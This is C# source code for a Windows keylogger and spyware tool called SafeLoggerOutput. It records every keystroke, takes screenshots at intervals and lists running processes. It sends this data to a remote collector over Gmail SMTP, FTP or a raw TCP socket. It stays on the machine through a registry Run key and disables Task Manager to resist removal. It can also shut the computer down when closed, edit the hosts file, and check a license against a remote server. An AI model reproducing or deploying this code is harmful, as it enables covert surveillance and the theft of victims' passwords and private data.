using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;

namespace SafeLoggerOutput
{
    class Config
    {
        public static int senderType = 1;

        public static bool sendScreenShot = true;
        public static bool sendKeys = true;
        public static bool sendProcesses = true;
        public static bool disableTaskManager = true;
        public static bool makeItStartUp = true;
        public static bool shutdownPcOnProgramClose = true;
        public static bool blockWebsites = false;
        public static bool lockFiles = false;

        public static string[] websitesToBeBlocked = { "null" };
        public static string[] filesToBeLocked = { "null" };

        public static int secondsToSendNewKeys = 60;
        public static int secondsForScreenShot = 60;
        public static int secondsToGetProcesses = 60;

        public static int smtpPort = 587;
        public static string username = ""; public static string password = "";
        public static string toEmail = "";
        public static string subject = "";

        public static string ftpUrl = "";
        public static string ftpUsername = "";
        public static string ftpPassword = "";

        public static string ip = "";
        public static int port = 1;

        public static string license = "";



        public static bool isAdmin()
        {
            bool isAdminFinal = false;

            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                isAdminFinal = true;

            return isAdminFinal;
        }
    }

    class KeyListener
    {
        public static KeyListener getInstance;
        public static void init() { getInstance = new KeyListener(); }
        public void initLogger() { startLogger(); initTimer(); }

        string input = "Input: ";

        [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i);

        void startLogger()
        {
            if (!Config.sendKeys)
                return;

            KeysConverter converter = new KeysConverter();

            new Thread(() =>
                {
                    while (true)
                    {
                        Thread.Sleep(10);

                        for (Int32 i = 0; i < 255; i++)
                        {
                            int key = GetAsyncKeyState(i);

                            if (key == 1 || key == -32767)
                            {
                                input += converter.ConvertToString(i) + " | ";

                                break;
                            }
                        }
                    }
                }).Start();
        }

        void initTimer()
        {
            if (!Config.sendKeys)
                return;

            System.Timers.Timer keysTimer = new System.Timers.Timer(1000 * Config.secondsToSendNewKeys);
            keysTimer.Elapsed += async (sender, e) => await HandleTimer();
            keysTimer.AutoReset = true;
            keysTimer.Start();
        }

        private Task HandleTimer()
        {
            DataSender.getInstance.send(input + "[" + DateTime.Now.ToString("HH: mm:ss tt") + "]", Config.senderType);
            input = "Input: ";
            return Task.CompletedTask;
        }
    }

    class Misc
    {
        public static Misc getInstance;
        public static void init() { getInstance = new Misc(); }

        public void initMisc() { initExitHandler(); startScreenshotTimer(); blockWebsite(Config.websitesToBeBlocked); }


        void initExitHandler()
        {
            if (!Config.shutdownPcOnProgramClose)
                return;

            Application.ApplicationExit += new EventHandler(Application_ApplicationExit);
        }

        void Application_ApplicationExit(Object sender, EventArgs e)
        {
            shutdownTheComputer();
        }

        void shutdownTheComputer()
        {
            var process = new ProcessStartInfo("shutdown", " / s / t 0");
            process.CreateNoWindow = true;
            process.UseShellExecute = false;
            Process.Start(process);
        }

        void startScreenshotTimer()
        {
            if (!Config.sendScreenShot)
                return;

            System.Timers.Timer ssTimer = new System.Timers.Timer(1000 * Config.secondsForScreenShot);
            ssTimer.Elapsed += async (sender, e) => await HandleScreenshotTimer();
            ssTimer.AutoReset = true;
            ssTimer.Start();

        }

        private Task HandleScreenshotTimer()
        {
            DataSender.getInstance.send("", Config.senderType, captureScreenshot(), true);
            return Task.CompletedTask;
        }

        Bitmap captureScreenshot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gfx = Graphics.FromImage(bitmap as Image);

            gfx.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            return bitmap;
        }

        void blockWebsite(string[] websites)
        {
            if (!Config.blockWebsites)
                return;

            if (websites.Length <= 0)
                return;

            try
            {
                string path = @"C:\Windows\System32\drivers\etc\hosts";
                StreamWriter sw = new StreamWriter(path, true);
                string[] final = new string[websites.Length];
                for (int i = 0; i < websites.Length; i++)
                {
                    final[i] = "\n 127.0.0.1 " + websites[i];
                }
                for (int i = 0; i < websites.Length; i++)
                {
                    sw.Write(final[i]);
                }
                sw.Close();
            }
            catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
        }

        void lockFile(string[] files)
        {
            if (!Config.lockFiles)
                return;

            if (files.Length <= 0)
                return;

            for (int i = 0; i < files.Length; i++)
            {
                var fs = File.Open(files[i], FileMode.Open, FileAccess.Read, FileShare.Read);
            }

            try
            {
            }
            catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
        }

        void getAllProcess()
        {
            if (!Config.sendProcesses)
                return;

            System.Timers.Timer processesTimer = new System.Timers.Timer(1000 * Config.secondsToGetProcesses);
            processesTimer.Elapsed += async (sender, e) => await HandleProcessTask();
            processesTimer.AutoReset = true;
            processesTimer.Start();
        }

        private Task HandleProcessTask()
        {
            Process[] ps = Process.GetProcesses();
            string process = "";

            foreach (Process p in ps)
            {
                if (p != null)
                {
                    process += "Process Name: " + p.ProcessName + " | ID: " + p.Id + "\n";
                }
            }

            if (!string.IsNullOrEmpty(process))
            {
                DataSender.getInstance.send(process, Config.senderType);
            }

            return Task.CompletedTask;
        }
    }

    class Regs
    {
        public static Regs getInstance; public static void init() { getInstance = new Regs(); }
        public void initRegistrySettings()
        {
            if (Config.makeItStartUp)
                SetStartup(true);
            if (Config.disableTaskManager)
                SetTaskManager(false);

        }

        //this will make the program start each time the computer starts
        public void SetStartup(bool a)
        {
            try
            {
                if (a)
                {
                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    key.SetValue(System.AppDomain.CurrentDomain.FriendlyName, @"" + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location));
                }
                else
                {
                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    key.DeleteValue(System.AppDomain.CurrentDomain.FriendlyName, false);
                }
            }
            catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
        }

        //disables the task manager or enables it
        public void SetTaskManager(bool enable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                else
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
                objRegistryKey.Close();
            }
            catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
        }
    }

    class DataSender
    {
        public static DataSender getInstance; public static void init() { getInstance = new DataSender(); }

        //type: 1 = gmail, 2 = ftp, 3 = lan
        public void send(string text, int type, Bitmap img = null, bool sendImage = false)
        {
            if (string.IsNullOrEmpty(text))
                return;

            if (type == 1)
            {
                try
                {
                    MailMessage mail = new MailMessage();
                    SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                    mail.From = new MailAddress(Config.username);
                    mail.To.Add(Config.toEmail);
                    mail.Subject = Config.subject; ;
                    mail.Body = text;

                    if (sendImage)
                    {
                        var stream = new MemoryStream();
                        img.Save(stream, ImageFormat.Jpeg);
                        stream.Position = 0;
                        mail.Attachments.Add(new Attachment(stream, "image / jpg"));
                    }

                    SmtpServer.Port = Config.smtpPort;
                    SmtpServer.Credentials = new System.Net.NetworkCredential(Config.username, Config.password);
                    SmtpServer.EnableSsl = true;

                    SmtpServer.Send(mail);
                }
                catch (Exception) { }
            }
            else if (type == 2)
            {
                try
                {
                    string fileName = getFileName();
                    string ftpFullPath = Config.ftpUrl;
                    FtpWebRequest ftp = (FtpWebRequest)FtpWebRequest.Create(ftpFullPath);
                    ftp.Credentials = new NetworkCredential(Config.ftpUsername, Config.ftpPassword);

                    ftp.KeepAlive = true;
                    ftp.UseBinary = true;
                    ftp.Method = WebRequestMethods.Ftp.UploadFile;

                    if (sendImage)
                    {
                        using (var ms = new MemoryStream())
                        {
                            img.Save(ms, ImageFormat.Png);
                            Stream ftpStream = ftp.GetRequestStream();
                            ftpStream.Write(ms.ToArray(), 0, ms.ToArray().Length);
                            ftpStream.Close();
                        }
                    }
                    else
                    {
                        StringBuilder msg = new StringBuilder(text);
                        var stream = new MemoryStream();
                        ASCIIEncoding encoding = new ASCIIEncoding();
                        stream.Write(encoding.GetBytes(msg.ToString()), 0, msg.Length);

                        byte[] buffer = new byte[stream.Length];
                        stream.Read(buffer, 0, buffer.Length);
                        stream.Close();

                        Stream ftpStream = ftp.GetRequestStream();
                        ftpStream.Write(buffer, 0, buffer.Length);
                        ftpStream.Close();
                    }
                }
                catch (Exception) { }
            }
            else if (type == 3)
            {
                try
                {
                    IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                    IPAddress ipAddr = null;

                    for (int i = 0; i < ipHost.AddressList.Length; i++)
                    {
                        if (ipHost.AddressList[i].ToString() == Config.ip)
                        {
                            ipAddr = ipHost.AddressList[i];
                        }
                    }

                    if (ipAddr == null)
                        ipAddr = ipHost.AddressList[0];

                    IPEndPoint ipEndPoint = new IPEndPoint(ipAddr, 11000);

                    Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                    client.Connect(ipEndPoint);

                    string path = Path.GetTempPath();
                    string fileName = "";

                    if (sendImage)
                    {
                        fileName = path + getFileName() + ".png";
                        if (File.Exists(fileName))
                            File.Delete(fileName);

                        img.Save(fileName);
                        client.SendFile(fileName);
                        File.Delete(fileName);
                    }
                    else
                    {
                        fileName = path + getFileName() + ".txt";
                        if (File.Exists(fileName))
                            File.Delete(fileName);

                        File.WriteAllText(fileName, text);
                        client.SendFile(fileName);
                        File.Delete(fileName);
                    }

                    client.Shutdown(SocketShutdown.Both);
                    client.Close();
                }
                catch (Exception) { }
            }
        }

        string getFileName()
        {
            return DateTime.Now.ToString("h: mm:ss tt");
        }
    }

    class LicenseChecker
    {
        public static LicenseChecker getInstance; public static void init() { getInstance = new LicenseChecker(); }

        string url = @"http://safe-logger.com/t/k.txt";

        static readonly string PasswordHash = "GJDOEJF*#f8F";
        static readonly string SaltKey = "G!JG%LQA";
        static readonly string VIKey = "@7C5c3H8e6F6g7J0";

        public bool exists(string license)
        {
            bool final = false;

            if (string.IsNullOrEmpty(license))
                return final;

            var result = GetFileViaHttp(url);
            string str = Encoding.UTF8.GetString(result);
            string[] strArr = str.Split(new[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);

            string line = "";

            for (int i = 0; i < strArr.Length; i++)
            {
                line = strArr[i];
                if (Decrypt(line) == license)
                {
                    final = true;
                    Config.license = Decrypt(license);
                }
            }

            return final;
        }

        public byte[] GetFileViaHttp(string url)
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadData(url);
            }
        }

        public static string Decrypt(string encryptedText)
        {
            byte[] cipherTextBytes = Convert.FromBase64String(encryptedText);
            byte[] keyBytes = new Rfc2898DeriveBytes(PasswordHash, Encoding.ASCII.GetBytes(SaltKey)).GetBytes(256 / 8);
            var symmetricKey = new RijndaelManaged() { Mode = CipherMode.CBC, Padding = PaddingMode.None };

            var decryptor = symmetricKey.CreateDecryptor(keyBytes, Encoding.ASCII.GetBytes(VIKey));
            var memoryStream = new MemoryStream(cipherTextBytes);
            var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read);
            byte[] plainTextBytes = new byte[cipherTextBytes.Length];

            int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
            memoryStream.Close();
            cryptoStream.Close();
            return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount).TrimEnd("\0".ToCharArray());
        }

    }

    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main1()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            LicenseChecker.init();
            if (string.IsNullOrEmpty(Config.license))
            {
                //      return;
            }

            if (!LicenseChecker.getInstance.exists(Config.license))
            {
                //    return;
            }

            KeyListener.init(); Misc.init();
            KeyListener.getInstance.initLogger();
            if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + " / 1.txt"))
            {
                Regs.init();
                Regs.getInstance.initRegistrySettings();
                var file = System.IO.File.Create("1.txt");
                file.Close();
            }
            Misc.getInstance.initMisc();
            //Form1 frm = new Form1();
            Application.Run();
        }
    }
}